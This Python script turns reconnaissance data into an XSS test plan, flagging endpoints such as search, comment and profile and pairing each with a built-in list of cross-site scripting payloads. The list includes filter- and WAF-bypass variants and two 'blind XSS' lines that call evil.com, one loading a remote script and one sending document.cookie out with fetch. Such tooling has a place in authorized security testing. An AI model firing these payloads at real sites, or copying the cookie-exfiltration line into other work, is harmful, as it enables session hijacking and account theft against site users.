#!/usr/bin/env python3
"""
XSS Attack Template Generator
Takes recon output and generates high‑quality test cases for XSS bugs.

Usage:
1. Prepare recon.json with assets, endpoints, and auth flows.
2. Run: python3 attack_template_xss.py
3. Review generated test plan in xss_tests.json
"""

import json
import sys
from pathlib import Path

def load_recon(path):
    """Load recon output from JSON."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"[!] Error loading recon.json: {e}")
        sys.exit(1)

def extract_xss_targets(recon):
    """
    Identify likely XSS endpoints from recon output.
    Look for:
    - Reflection points (search, profile, comments)
    - User input fields
    - Content that gets rendered
    """
    targets = []
    xss_indicators = ["search", "query", "q", "comment", "profile", "name", "description", "message", "content", "render", "preview"]
    for asset in recon.get("assets", []):
        host = asset.get("host")
        for endpoint in asset.get("endpoints", []):
            path = endpoint.get("path", "")
            method = endpoint.get("method", "GET")
            auth_required = endpoint.get("auth_required", False)
            # Check if path indicates user input
            path_lower = path.lower()
            notes_lower = endpoint.get("notes", "").lower()
            if any(indicator in path_lower for indicator in xss_indicators) or any(indicator in notes_lower for indicator in xss_indicators):
                targets.append({
                    "host": host,
                    "method": method,
                    "path": path,
                    "auth_required": auth_required,
                    "notes": endpoint.get("notes", ""),
                    "likely_param": next((p for p in xss_indicators if p in path_lower), "input")
                })
            # Also check for POST endpoints that likely accept user data
            if method == "POST" and any(kw in notes_lower for kw in ["form", "submit", "create", "update"]):
                targets.append({
                    "host": host,
                    "method": method,
                    "path": path,
                    "auth_required": auth_required,
                    "notes": endpoint.get("notes", ""),
                    "likely_param": "form_field"
                })
    return targets

def generate_xss_payloads():
    """Generate a set of XSS payloads for testing."""
    payloads = [
        # Basic
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        # Filter bypasses
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert&#40;1&#41;>",
        # Context-specific
        "';alert(1);//",
        "\"><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>",
        # Polyglots
        "javascript:alert(1)//",
        "<script>/* */alert(1)</script>",
        # DOM-based
        "#<script>alert(1)</script>",
        "?<script>alert(1)</script>",
        # Template literals
        "`${alert(1)}`",
        # XSS in attributes
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        # Blind XSS
        "<script src=https://evil.com/xss.js></script>",
        "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
        # Advanced
        "<iframe src=javascript:alert(1)></iframe>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        # WAF bypass
        "<script>alert(/XSS/)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>"
    ]
    return payloads

def generate_xss_tests(targets):
    """
    For each target, generate concrete test cases with payloads.
    """
    payloads = generate_xss_payloads()
    tests = []
    for t in targets:
        for payload in payloads:
            tests.append({
                "host": t["host"],
                "method": t["method"],
                "path": t["path"],
                "auth_required": t["auth_required"],
                "parameter": t["likely_param"],
                "payload": payload,
                "description": f"XSS test with payload: {payload}",
                "what_to_watch": [
                    "Script execution in response",
                    "Alert/prompt/confirm dialogs",
                    "Error messages revealing filtering",
                    "Reflection in HTML context",
                    "DOM manipulation"
                ]
            })
    return tests

def save_tests(tests, path):
    """Save generated tests to JSON."""
    with open(path, "w", encoding="utf-8") as f:
        json.dump(tests, f, indent=2)
    print(f"[+] Saved XSS test plan to: {path}")

def print_summary(tests):
    """Print a quick summary of generated tests."""
    print("\n--- XSS Test Plan Summary ---")
    print(f"Generated {len(tests)} test cases.")
    for i, t in enumerate(tests[:10], 1):
        print(f"{i:2d}. {t['method']} {t['host']}{t['path']}")
        print(f"    Parameter: {t['parameter']}")
        print(f"    Payload: {t['payload']}")
        print(f"    Auth required: {t['auth_required']}")
        print()
    if len(tests) > 10:
        print(f"... and {len(tests) - 10} more tests. See xss_tests.json for full list.")

def main():
    recon_file = Path("recon.json")
    tests_file = Path("xss_tests.json")
    if not recon_file.is_file():
        print("[!] Creating stub recon.json – please edit with real recon data.")
        stub = {
            "assets": [
                {
                    "host": "app.example.com",
                    "type": "web_app",
                    "auth_required": True,
                    "endpoints": [
                        {"method": "GET", "path": "/search", "auth_required": False, "notes": "Search endpoint reflects query"},
                        {"method": "POST", "path": "/api/v1/comments", "auth_required": True, "notes": "Submit comment"},
                        {"method": "GET", "path": "/profile", "auth_required": True, "notes": "User profile display"}
                    ]
                }
            ]
        }
        with open(recon_file, "w", encoding="utf-8") as f:
            json.dump(stub, f, indent=2)
        print(f"[+] Stub created at: {recon_file}")
        print("[!] Edit recon.json with real recon data and re-run.")
        return

    recon = load_recon(recon_file)
    targets = extract_xss_targets(recon)
    tests = generate_xss_tests(targets)
    save_tests(tests, tests_file)
    print_summary(tests)

if __name__ == "__main__":
    main()
